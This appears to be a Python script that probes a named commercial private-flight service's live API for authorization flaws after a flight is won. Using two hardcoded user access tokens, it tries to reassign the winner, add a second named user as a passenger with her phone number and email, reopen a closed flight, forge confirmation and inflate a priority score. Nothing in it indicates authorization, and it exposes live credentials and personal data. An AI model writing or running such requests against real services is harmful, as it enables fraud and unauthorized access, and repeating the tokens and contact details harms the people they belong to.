#!/usr/bin/env python3
"""
Post-Win Flight Manipulation Testing
Test what can be modified or exploited after winning a flight
"""

import requests
import json

API_BASE = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

FLIGHT_ID = 8847  # The won flight
SAMEER_ID = 20254
ASHLEY_ID = 171208

def test_request(method, endpoint, data=None, token=SAMEER_TOKEN, description=""):
    """Make API request and return result"""
    headers = {"Authorization": f"Bearer {token}"}
    if data:
        headers["Content-Type"] = "application/json"

    url = f"{API_BASE}{endpoint}"

    try:
        if method == "GET":
            resp = requests.get(url, headers=headers)
        elif method == "POST":
            resp = requests.post(url, headers=headers, json=data)
        elif method == "PATCH":
            resp = requests.patch(url, headers=headers, json=data)
        elif method == "PUT":
            resp = requests.put(url, headers=headers, json=data)
        elif method == "DELETE":
            resp = requests.delete(url, headers=headers)

        return {
            'status': resp.status_code,
            'success': resp.status_code < 400,
            'data': resp.json() if resp.text else None,
            'description': description
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'success': False,
            'data': str(e),
            'description': description
        }

def main():
    print("="*80)
    print("POST-WIN FLIGHT MANIPULATION TESTING")
    print("="*80)
    print(f"\nTarget: Flight {FLIGHT_ID} (Rifle → San Jose)")
    print(f"Winner: Sameer (ID: {SAMEER_ID})")
    print(f"Status: CLOSED, isConfirmedByWinner=false")

    tests = []

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 1: Winner Field Manipulation")
    print("="*80)

    # Test 1: Change winner to Ashley
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {"winner": ASHLEY_ID},
                         description="Change winner to Ashley")
    tests.append(result)
    print(f"\n1. Change winner to Ashley:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")
    if result['success']:
        print(f"   🚨 VULNERABILITY: Winner field is modifiable!")

    # Test 2: Set winner to null
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {"winner": None},
                         description="Clear winner field")
    tests.append(result)
    print(f"\n2. Clear winner field (set to null):")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # Test 3: Add multiple winners (array)
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {"winner": [SAMEER_ID, ASHLEY_ID]},
                         description="Set multiple winners")
    tests.append(result)
    print(f"\n3. Set multiple winners:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 2: Passenger List Manipulation")
    print("="*80)

    # Test 4: Add passenger via POST
    result = test_request("POST", f"/v1/flight/{FLIGHT_ID}/passenger",
                         {
                             "firstName": "Ashley",
                             "lastName": "Rager",
                             "phoneNumber": "+17203521547",
                             "email": "ashleyrager15@yahoo.com",
                             "user": ASHLEY_ID
                         },
                         description="Add Ashley as passenger")
    tests.append(result)
    print(f"\n4. Add Ashley as passenger:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")
    if result['success']:
        print(f"   🚨 VULNERABILITY: Can add passengers to closed flight!")

    # Test 5: PATCH passengers array
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {
                             "passengers": [
                                 {"user": SAMEER_ID, "firstName": "Sameer"},
                                 {"user": ASHLEY_ID, "firstName": "Ashley"}
                             ]
                         },
                         description="Modify passengers array")
    tests.append(result)
    print(f"\n5. Modify passengers array:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 3: Entrant Manipulation")
    print("="*80)

    # Test 6: Join Ashley to closed flight with V2 API
    result = test_request("POST", f"/v2/flight/{FLIGHT_ID}/enter",
                         token=ASHLEY_TOKEN,
                         description="Join closed flight (Ashley)")
    tests.append(result)
    print(f"\n6. Join Ashley to closed flight:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")
    if result['success']:
        print(f"   🚨 VULNERABILITY: Can join closed flights!")

    # Test 7: Add entrant via PATCH
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {
                             "entrants": [
                                 {"id": SAMEER_ID, "queuePosition": 0},
                                 {"id": ASHLEY_ID, "queuePosition": 1}
                             ]
                         },
                         description="Modify entrants array")
    tests.append(result)
    print(f"\n7. Modify entrants array:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 4: Confirmation & Status")
    print("="*80)

    # Test 8: Confirm win
    result = test_request("POST", f"/v1/flight/{FLIGHT_ID}/confirm",
                         description="Confirm flight win")
    tests.append(result)
    print(f"\n8. Confirm flight win:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # Test 9: Unconfirm win
    result = test_request("POST", f"/v1/flight/{FLIGHT_ID}/unconfirm",
                         description="Unconfirm flight")
    tests.append(result)
    print(f"\n9. Unconfirm flight:")
    print(f"   Status: {result['status']}")
    print(f"   Success: {result['success']}")

    # Test 10: Change isConfirmedByWinner
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {"isConfirmedByWinner": True},
                         description="Set isConfirmedByWinner=true")
    tests.append(result)
    print(f"\n10. Set isConfirmedByWinner=true:")
    print(f"    Status: {result['status']}")
    print(f"    Success: {result['success']}")

    # Test 11: Change status back to PENDING
    result = test_request("PATCH", f"/v1/flight/{FLIGHT_ID}",
                         {"status": 1},  # PENDING = 1
                         description="Change status to PENDING")
    tests.append(result)
    print(f"\n11. Change status back to PENDING:")
    print(f"    Status: {result['status']}")
    print(f"    Success: {result['success']}")
    if result['success']:
        print(f"    🚨 VULNERABILITY: Can reopen closed flights!")

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 5: Priority Score Manipulation Post-Win")
    print("="*80)

    # Test 12: Try to set priority score back
    result = test_request("PATCH", f"/v1/user",
                         {"priorityScore": 1931577847},  # Old score
                         description="Revert priority score")
    tests.append(result)
    print(f"\n12. Revert priority score to pre-win value:")
    print(f"    Status: {result['status']}")
    print(f"    Success: {result['success']}")

    # Test 13: Try to boost priority score further
    result = test_request("PATCH", f"/v1/user",
                         {"priorityScore": 2000000000},  # +1 more year
                         description="Boost priority score")
    tests.append(result)
    print(f"\n13. Boost priority score even higher:")
    print(f"    Status: {result['status']}")
    print(f"    Success: {result['success']}")

    # =========================================================================
    print(f"\n{'='*80}")
    print("TEST CATEGORY 6: Check for New Data After Win")
    print("="*80)

    # Test 14: Get flight details and see if anything changed
    result = test_request("GET", f"/v1/flight/{FLIGHT_ID}",
                         description="Get flight details")
    tests.append(result)
    print(f"\n14. Get current flight state:")
    print(f"    Status: {result['status']}")
    if result['success'] and result['data']:
        print(f"    Winner: {result['data'].get('winner')}")
        print(f"    isConfirmedByWinner: {result['data'].get('isConfirmedByWinner')}")
        print(f"    Number of passengers: {len(result['data'].get('passengers', []))}")
        print(f"    Number of entrants: {result['data'].get('numberOfEntrants')}")

    # =========================================================================
    print(f"\n{'='*80}")
    print("SUMMARY")
    print("="*80)

    successful_tests = [t for t in tests if t['success']]
    vulnerable_tests = [t for t in tests if t['success'] and t['status'] == 200]

    print(f"\nTotal tests: {len(tests)}")
    print(f"Successful responses: {len(successful_tests)}")
    print(f"Potential vulnerabilities: {len(vulnerable_tests)}")

    if vulnerable_tests:
        print(f"\n🚨 VULNERABILITIES FOUND:")
        for test in vulnerable_tests:
            print(f"  - {test['description']}")
    else:
        print(f"\n✅ No post-win vulnerabilities found")
        print(f"   All modification attempts blocked by server")

    # Save results
    with open('/home/user/vaunt/api_testing/post_win_test_results.json', 'w') as f:
        json.dump(tests, f, indent=2)

    print(f"\n📄 Results saved to: post_win_test_results.json")

if __name__ == "__main__":
    main()
